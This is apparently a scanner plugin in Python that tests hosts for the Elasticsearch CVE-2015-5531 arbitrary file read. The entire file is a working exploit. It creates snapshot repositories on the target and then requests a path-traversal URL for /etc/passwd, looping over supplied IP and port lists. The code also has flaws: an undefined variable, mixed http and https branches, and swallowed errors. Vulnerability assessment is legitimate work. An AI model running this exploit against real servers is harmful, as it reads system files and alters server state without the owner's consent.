#!/usr/bin/env python
# -*- coding:utf-8 -*-

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'read_cve20155531'
        self.info = "Check the Elasticsearch arbitrary file read vuln CVE-2015-5531"
        self.keyword = ['all', 'elasticsearch', 'file_read', 'web', 'intranet', 'cve_2015_5531', '9200',]
        self.default_ports_list = [9200,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        reponame = "test4sec"
        data1 = {"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/%s"%(reponame)}}
        data2 = {"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/%s/snapshot-backdata"%(reponame)}}
        
        url1_4create_repo = "http://%s:%d/_snapshot/%s"%(ip, port, reponame) if add_web_path == "" else "http://%s:%d/%s/_snapshot/%s"%(ip, port, add_web_path, reponame)
        url1_4create_snapshot = "http://%s:%d/_snapshot/%snew"%(ip, port, reponame) if add_web_path == "" else "http://%s:%d/%s/_snapshot/%snew"%(ip, port, add_web_path, reponame)
        url1_4check = "http://%s:%d/_snapshot/%s/"%(ip, port, reponame)+"backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" if add_web_path == "" else "http://%s:%d/%s/_snapshot/%s/"%(ip, port, add_web_path, reponame)+"backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
        
        url2_4create_repo = "https://%s:%d/_snapshot/%s"%(ip, port, reponame) if add_web_path == "" else "https://%s:%d/%s/_snapshot/%s"%(ip, port, add_web_path, reponame)
        url2_4create_snapshot = "https://%s:%d/_snapshot/%snew"%(ip, port, reponame) if add_web_path == "" else "http://%s:%d/%s/_snapshot/%snew"%(ip, port, add_web_path, reponame)
        url2_4check = "https://%s:%d/_snapshot/%s/"%(ip, port, reponame)+"backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" if add_web_path == "" else "http://%s:%d/%s/_snapshot/%s/"%(ip, port, add_web_path, reponame)+"backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

        try:
            req_4create_repo = Requester(url1_4create_repo, jsons=data1, method="post")
            req_4create_snapshot = Requester(url1_4create_snapshot, jsons=data2, method="post")
            req_check = Requester(url1_4check)
            if req_check.code == 400:
                result = "exists Elasticsearch arbitrary file read vuln CVE-2015-5531, check url: %s"%(url1_4check)
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req_4create_repo = Requester(url2_4create_repo, jsons=data1, method="post")
                req_4create_snapshot = Requester(url2_4create_snapshot, jsons=data2, method="post")
                req_check = Requester(url2_4check)
                if req_check.code == 400:
                    result = "exists Elasticsearch arbitrary file read vuln CVE-2015-5531, check url: %s"%(url2_4check)
                    self._output(ip, port, result)
            except: pass
        except: pass

globals()['VulnChecker'] = VulnChecker